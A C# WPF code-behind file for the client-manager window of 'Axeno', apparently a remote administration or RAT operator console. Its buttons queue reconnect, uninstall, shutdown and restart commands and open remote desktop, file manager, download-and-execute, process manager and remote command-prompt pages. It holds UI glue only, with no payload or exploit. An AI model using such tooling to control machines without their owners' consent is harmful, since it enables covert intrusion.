using Axeno.Helper;
using Axeno.Networking.Connection;
using Axeno.Networking.Functions;
using Axeno.Networking.Functions.System;
using Axeno.Views.Pages.ClientManager;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace Axeno.Views.Windows
{
    /// <summary>
    /// Interaction logic for ClientManager.xaml
    /// </summary>
    public partial class ClientManager : Window
    {
        public static Client Client { get; set; }   

        public ClientManager(Client cli)
        {
            InitializeComponent();
            Client = cli;
            cli.Manager = this;
            Loaded += ClientManager_Loaded;
            Closed += ClientManager_Closed;
            SizeChanged += ClientManager_SizeChanged;
            
        }

        private void ClientManager_SizeChanged(object sender, SizeChangedEventArgs e)
        {

        }

        private void ClientManager_Closed(object sender, EventArgs e)
        {
            Client.Manager = null;
        }

        private void ClientManager_Loaded(object sender, RoutedEventArgs e)
        {
            ClientManagerSlides.frmdevmgr = frmdevmgr;
            frmdevmgr.Navigate(new SysInfo(Client));
        }

        private void Border_MouseDown(object sender, MouseButtonEventArgs e)
        {
            try
            {
                DragMove();
            }
            catch
            {

            }
        }

        private void closebtn_MouseDown(object sender, MouseButtonEventArgs e)
        {
            Close();
        }

        private void minimizebtn_MouseDown(object sender, MouseButtonEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void sysinfoclick_Click(object sender, RoutedEventArgs e)
        {
            frmdevmgr.Navigate(new SysInfo(Client));

        }

        private void reconclient_Click(object sender, RoutedEventArgs e)
        {
            Client.QueueCommand(ClientControl.Reconnect());
        }

        private void disconclient_Click(object sender, RoutedEventArgs e)
        {
            Client.QueueCommand(ClientControl.Disconnect());

        }

        private void uninclient_Click(object sender, RoutedEventArgs e)
        {
            Client.QueueCommand(ClientControl.Uninstall());

        }

        private void signout_Click(object sender, RoutedEventArgs e)
        {
            Client.QueueCommand(PowerControl.Signout());
        }

        private void shutdown_Click(object sender, RoutedEventArgs e)
        {
            Client.QueueCommand(PowerControl.Shutdown());

        }

        private void restart_Click(object sender, RoutedEventArgs e)
        {
            Client.QueueCommand(PowerControl.Restart());

        }

        private void desktopclick_Click(object sender, RoutedEventArgs e)
        {
            if (Client.Rdp == null)
            {
                frmdevmgr.Navigate(new RemoteDesktop(Client));
            }
            else
            {
                frmdevmgr.Navigate(Client.Rdp);

            }

        }

        private void filexplorer_Click(object sender, RoutedEventArgs e)
        {
            frmdevmgr.Navigate(new FileManager(Client));

        }

        private void sendFile_Click(object sender, RoutedEventArgs e)
        {
            frmdevmgr.Navigate(new Dl_Execute(Client));

        }

        private void maximisebtn_MouseDown(object sender, MouseButtonEventArgs e)
        {
            this.WindowState = WindowState.Maximized;
        }

        private void netcon_Click(object sender, RoutedEventArgs e)
        {
            frmdevmgr.Navigate(new network_connections(Client));
        }

        private void maximise_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (this.WindowState == WindowState.Maximized) { this.WindowState = WindowState.Normal; return; }
            this.WindowState = WindowState.Maximized;
        }

        private void procmgr_Click(object sender, RoutedEventArgs e)
        {
            frmdevmgr.Navigate(new Proc_mgr(Client));

        }

        private void cmdline_Click(object sender, RoutedEventArgs e)
        {
            if (Client.cmd == null)
            {
                frmdevmgr.Navigate(new command_prompt(Client));
            }
            else
            {
                frmdevmgr.Navigate(Client.cmd);

            }
        }
    }
}
